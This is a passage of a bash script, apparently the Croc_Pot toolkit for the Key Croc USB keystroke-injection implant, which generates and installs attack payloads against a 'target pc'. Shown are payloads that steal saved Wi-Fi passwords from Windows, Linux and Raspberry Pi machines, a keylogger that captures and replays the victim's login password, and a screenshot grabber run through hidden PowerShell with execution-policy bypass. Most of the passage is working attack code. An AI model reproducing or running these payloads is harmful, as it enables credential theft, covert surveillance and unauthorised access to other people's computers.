\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/tools/Croc_Pot/wifipass.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' -e 's/\\\r//g' root/udisk/config.txt)\nsleep 2\nUNLOCK\nLED FINISH" >> ${GETONLINE_WINDOWS}
		echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE WINDOWS PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n"
		echo -ne "\n${LINE}\n" ; cat ${GETONLINE_WINDOWS} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; get_online_p ;;
	esac
fi
##
#----Getonline Linux payload
##
if [ -e "${GETONLINE_LINUX}" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'GETONLINE LINUX PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
	echo -ne "\n${LINE}\n" ; cat ${GETONLINE_LINUX} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL GETONLINE PAYLOAD FOR LINUX Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           Linux Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n\nMATCH linuxonline\n
#---> Check for saved passwd run CrocUnlock payload first if not edit passwd below\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\" ]; then\n	PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\nelse\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n
rm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE\nLED ATTACK\n#---> start target pc terminal\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\n#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"\nQ ENTER\nsleep 1\n#---> Entering Linux passwd\nQ STRING \"\${PC_PW}\"\nQ ENTER\nsleep 1
#---> Place keycroc usb drive into variable\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Linux_GetOnline.txt
Q STRING \"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sed -n \\\"/\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')/p\\\" | sed -e 's/=/ /g' | tee \\\${LINUX_ON}\"
Q ENTER\nsleep 2\n#---> Unmount keycroc usb drive\nQ STRING \"sudo umount /media/\\\$(whoami)/KeyCroc/\"\nQ ENTER\nsleep 1\n#---> Return back to ATTACKMODE HID mode\nATTACKMODE HID\n#---> Remove keycroc directory off target pc\nQ STRING \"sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\nQ ENTER
#---> Remone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/Linux_GetOnline.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt)\nLED FINISH" >> ${GETONLINE_LINUX}
		echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE LINUX PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n"
		echo -ne "\n${LINE}\n" ; cat ${GETONLINE_LINUX} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; get_online_p ;;
	esac
fi
##
#----Getonline Raspberry pi payload
##
if [ -e "${GETONLINE_RASPBERRY}" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'GETONLINE RASPBERRY PI PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
	echo -ne "\n${LINE}\n" ; cat ${GETONLINE_RASPBERRY} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL GETONLINE PAYLOAD FOR RASPBERRY PI Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           Raspberry PI Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\nMATCH rasponline\n#\nrm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE
LED ATTACK\n# --> start Raspberry PI terminal\nQ CONTROL-ALT-d\nQ CONTROL-ALT-t\nsleep 2
# --> Place keycroc usb drive into variable\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n# --> Retrieve Target current ssid (Wifi)\nQ STRING \"t_ssid=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"
Q ENTER\nsleep 1\n# --> Retrieve Target wifi passwd\nQ STRING \"t_pw=\\\$(sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$t_ssid/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"\nQ ENTER\nsleep 1\n# --> Save ssid & passwd to keycroc\nQ STRING \"echo \\\$t_ssid \\\$t_pw >> \\\${LINUX_ON}\"
Q ENTER\nsleep 3\nQ STRING \"exit\"\nQ ENTER\nATTACKMODE HID\nsleep 2\n# --> Remone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed
\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/Linux_GetOnline.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt)\nLED FINISH" >> ${GETONLINE_RASPBERRY}
		echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE RASPBERRY PI PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n"
		echo -ne "\n${LINE}\n" ; cat ${GETONLINE_RASPBERRY} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; get_online_p ;;
	esac
fi
}
##
#----CrocUnlock Payload Function
##
croc_unlock_p() {
	clear
	echo -ne "$(Info_Screen '
-Start by pressing GUI + l , open target pc login screen
-This will forus the user to enter password and save to tools/Croc_Pot
-This will create another payload called Croc_unlock_2.txt
-Next time at login screen type in crocunlock
-This will enter the user password and login
-First time running this may need to unplug and plug back in
-Tested on Windows,Raspberrypi,Linux')\n"
	echo -ne "$(ColorRed '
--THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n 
--AFTER THE USER HAS ENTER THE PASSWORD\n
--WORK FOR PIN NUMBER TO AS LONG AS THE ENTER KEY HAS BE PRESSED AFTER\n')"
	echo -ne "\e[48;5;202;30m${LINE}${clear}\n\n"
if [ -e "/root/udisk/payloads/Croc_unlock_1.txt" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
	echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_unlock_1.txt ; echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_unlock_2.txt ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROCUNLOCK PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           CrocUnlock (payload #1)\n# Description:     Record keystrokes and save to tools/Croc_Pot and Create second payload called (CrocUnlock PAYLOAD #2)\n#                  Run Croc_Pot_Payload.txt first to get OS\n# Author:          spywill / RootJunky\n# Version:         1.4\n# Category:        Key Croc\n#\n#\nMATCH GUI-l\n#
CROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\nFULL_IN=\"MAT\"\n#rm /root/udisk/tools/Croc_Pot/Croc_unlock.txt /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\n#\nif [ -e \"/root/udisk/payloads/Croc_unlock_2.txt\" ]; then\n	LED B\nelse\n	LED SETUP\n	echo -e \"# Title:           CrocUnlock (PAYLOAD #2)\\\n# Description:     Log into Target pc with Match word crocunlock, Run CrocUnlock (PAYLOAD #1) first\\\n# Author:          RootJunky / Spywill\\\n# Version:         1.4\\\n# Category:        Key Croc\\\n#\\\n#\\\n\${FULL_IN}CH crocunlock
#\\\n\\\$(sed -i 's/crocunlock//g' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\nif [[ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt && /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]]; then\\\n	case \\\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\\\nWINDOWS)\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\nLINUX)\\\n	case \\\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in
raspberrypi)\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q STRING \\\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)\n	Q ENTER\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\n$HOST_CHECK)\\\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
	Q ENTER ;;\\\n*)\\\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\n	esac\\\n	esac\\\nelse\\\n	LED R\\\nfi\" >> \${CROC_UNLOCK}\n	LED FINISH\nfi\n#\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_OS.txt\" ]; then\n	case \$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nWINDOWS)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
	LED ATTACK ;;\nLINUX)\n	case \$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nraspberrypi)\n	Q CONTROL-ALT-F3\n	sleep 1\n	Q STRING \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)\"\n	Q ENTER\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n	LED ATTACK ;;\n$HOST_CHECK)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n	LED ATTACK ;;\n*)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
	LED ATTACK ;;\n	esac\n	esac\nelse\n	LED R\nfi" >> /root/udisk/payloads/Croc_unlock_1.txt
		echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROCUNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
		echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_unlock_1.txt ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; croc_unlock_p ;;
	esac
fi
}
##
#----Wifi Setup Payload connect to wifi ap quickly
##
wifi_setup_p() {
	clear
	echo -ne "$(Info_Screen '
-WITH THIS PAYLOAD YOU CAN CREATE MULTIPLE WIFI SETTING
-THE PURPOSE OF THIS PAYLOAD IS THAT IF YOU MOVE YOUR KEYCROC
-AROUND TO DIFFERENT WIFI ACCESS POINTS
-YOU CAN CREATE A PAYLOAD WITH MATCH WORD
-CONNECT TO WIFI ACCESS POINT QUICKLY
-BY TYPING IN MATCH WORD')\n\n"
while read_all ENTER A NAME FOR THIS PAYLOAD AND PRESS [ENTER] ; local namep=${r_a}; do
	local PAYLOAD_FOLDER=/root/udisk/payloads/${namep}.txt
	if [ -e "${PAYLOAD_FOLDER}" ]; then
		echo -ne "\n${LINE_}\e[5m$(ColorRed 'THIS PAYLOAD ALREADY EXISTS PLEASE CHOOSE A DIFFERENT NAME')${LINE_}\n"
		echo -ne "\n${LINE}\n" ; cat ${PAYLOAD_FOLDER} ; echo -ne "\n${LINE}\n"
	else
		touch ${PAYLOAD_FOLDER}
		read_all ENTER THE MATCH WORD YOU WOULD LIKE TO USE AND PRESS [ENTER] ; local USER_MATCH=${r_a}
		read_all ENTER THE SSID AND PRESS [ENTER] ; local USER_SSID=${r_a}
		read_all ENTER THE PASSWORD AND PRESS [ENTER] ; local WIFI_PASS=${r_a}
	echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
MATCH ${USER_MATCH}\nLED SETUP\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt)\nsleep 1\nLED FINISH" >> ${PAYLOAD_FOLDER}
		echo -ne "\n${red}***${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}***${clear}\n
$(Info_Screen '
--UNPLUG THE KEYCROC AND PLUG BACK IN
--TYPE IN YOUR MATCH WORD LED WILL LIGHT UP GREEN
--THEN UNPLUG THE KEYCROC AND PLUG BACK IN
--YOUR KEYCROC SHOULD NOW BE CONNECTED TO YOUR WIFI SETUP\n')\n"
	echo -ne "\n${LINE}\n" ; cat ${PAYLOAD_FOLDER} ; echo -ne "\n${LINE}\n"
		break
	fi
done
}
##
#----Quick_Start_Croc_Pot (payload) start Croc_Pot without OS detection
##
quick_croc_pot() {
	clear
	echo -ne "\n$(Info_Screen '
-Install payload called Quick_Start_Croc_Pot
-Quickly Start Croc_Pot without OS detection
-This is for when you Already ran OS detection on target pc by crocpot
-Match word is qspot')\n\n"
	local qs_croc=/root/udisk/payloads/Quick_start_Croc_Pot.txt
if [ -e "${qs_croc}" ]; then
	echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${qs_croc} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL QUICK START CROC_POT PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:         Quick Start Croc_Pot\n# Description:   Quickly Start Croc_pot.sh bash script without OS detection\n#                Will need to run Croc_Pot_Payload.txt first before running this payload
#                This is for when you Already ran OS detection on target pc\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
echo \"\${CROC_PW}\" >> /tmp/CPW.txt\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	Q GUI d\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
	Q ENTER\n	sleep 3\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
	LED B\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
	Q ENTER ;;\n    $HOST_CHECK)\n	Q GUI d\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n    *)\n	Q GUI d\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n  esac\n fi\nfi\nLED FINISH" >> ${qs_croc}
		echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat ${qs_croc} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; quick_croc_pot ;;
	esac
fi
}
##
#----Croc_Shot take Screenshot of target pc and save to loot folder
##
screen_shot() {
	clear
	echo -ne "$(Info_Screen '
-Option to install Croc_Shot.txt payload this will take screenshot of Target pc
-To start the Croc_Shot payload MATCH word crocshot
-This will save to loot/Croc_Pot/screenshot
-Option to take screenshot now
-For this to work properly run Croc_Pot_Payload.txt first to get OS detection')\n\n"
if [ -d /root/udisk/loot/Croc_Pot/screenshot ]; then
	LED B
else
	mkdir /root/udisk/loot/Croc_Pot/screenshot
fi
##
#----Screen Croc_Shot Payload install
##
	local Croc_Shot=/root/udisk/payloads/Croc_Shot.txt
if [ -e "${Croc_Shot}" ]; then
	echo -ne "\n${LINE_}$(ColorGreen 'Croc_Shot.txt Payload is installed check payload folder')${clear}${LINE_}\n"
	echo -ne "\n${LINE}\n" ; cat ${Croc_Shot} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROC_SHOT PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH crocshot\n\n#---> Check for save passwd run CrocUnlock first if not edit below\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\" ]; then\n	PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
else\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n\nif [ -d /root/udisk/loot/Croc_Pot/screenshot ]; then\n	LED B\nelse\n	mkdir /root/udisk/loot/Croc_Pot/screenshot\nfi\n\nWINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1\nOS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\nHOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\n	if [ -e \"\${WINDS_SHOT}\" ]; then
	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\nelse\n	LED ATTACK
echo -ne \"\\\$outputFile = \\\"\\\$Croc\loot\Croc_Pot\screenshot\\\\\\\\\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\\\"\\\n\nAdd-Type -AssemblyName System.Windows.Forms\\\nAdd-type -AssemblyName System.Drawing\\\n\n\\\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\\\n\\\$Width = \\\$Screen.Width\\\n
\\\$Height = \\\$Screen.Height\\\n\\\$Left = \\\$Screen.Left\\\n\\\$Top = \\\$Screen.Top\\\n\\\$screenshotImage = New-Object System.Drawing.Bitmap \\\$Width, \\\$Height\\\n\n\\\$graphicObject = [System.Drawing.Graphics]::FromImage(\\\$screenshotImage)\\\n\\\$graphicObject.CopyFromScreen(\\\$Left, \\\$Top, 0, 0, \\\$screenshotImage.Size)\\\n
\\\$screenshotImage.Save(\\\$outputFile)\\\nWrite-Output \\\"Saved to:\\\"\\\nWrite-Output \\\$outputFile\\\nStart-Sleep -s 5\" >> \${WINDS_SHOT}\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\n	fi\nelse\ncase \$HOST_CHECK in\nraspberrypi)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	sleep 1\n	Q ALT-F4\n	Q CONTROL-ALT-t
	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	sleep 2\n	ATTACKMODE HID\n	LED FINISH ;;\n\$HOST_CHECK)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"
	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10
	ATTACKMODE HID\n	LED FINISH ;;\n*)\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH ;;\n esac\nfi" >> ${Croc_Shot}
		echo -ne "${green}Croc_Shot.txt payload is now install check payloads folder${clear}\n"
		echo -ne "\n${LINE}\n" ; cat ${Croc_Shot} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; screen_shot ;;
	esac
fi
##
#----Croc_Shot take pic run from terminal
##
read_all TAKE SCREENSHOT NOW OF TARGET PC Y/N AND PRESS [ENTER]
case $r_a in
	[yY] | [yY][eE][sS])
		ATTACKMODE HID STORAGE
		local WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			if [ -e "${WINDS_SHOT}" ]; then
				Q GUI r ; sleep 1 ; Q STRING "powershell -nop -ex Bypass -w Hidden" ; Q ENTER ; sleep 1
				Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
				Q ENTER ; sleep 1 ; Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; ATTACKMODE HID
			else
		echo -ne "\$outputFile = \"\$Croc\loot\Croc_Pot\screenshot\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\"\n
Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawing\n
\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\$Width = \$Screen.Width\n
\$Height = \$Screen.Height\n\$Left = \$Screen.Left\n\$Top = \$Screen.Top\n\$screenshotImage = New-Object System.Drawing.Bitmap \$Width, \$Height\n
\$graphicObject = [System.Drawing.Graphics]::FromImage(\$screenshotImage)\n\$graphicObject.CopyFromScreen(\$Left, \$Top, 0, 0, \$screenshotImage.Size)\n
\$screenshotImage.Save(\$outputFile)\nWrite-Output \"Saved to:\"\nWrite-Output \$outputFile\nStart-Sleep -s 5" >> ${WINDS_SHOT}
		Q GUI r ; sleep 1 ; Q STRING "powershell -nop -ex Bypass -w Hidden" ; Q ENTER ; sleep 1
		Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)" ; Q ENTER ; sleep 1
		Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; ATTACKMODE HID
			fi
		else
			case $HOST_CHECK in
			raspberrypi)
				Q ALT-TAB ; Q CONTROL-ALT-t ; sleep 1
				Q STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 2 \${PC_PIC} &>/dev/null & exit"
				Q ENTER ; Q ALT-TAB ; sleep 3 ; ATTACKMODE HID ;;
			$HOST_CHECK)
				Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1
				Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
				Q ENTER ; sleep 3 ; Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; Q ENTER ; sleep 1
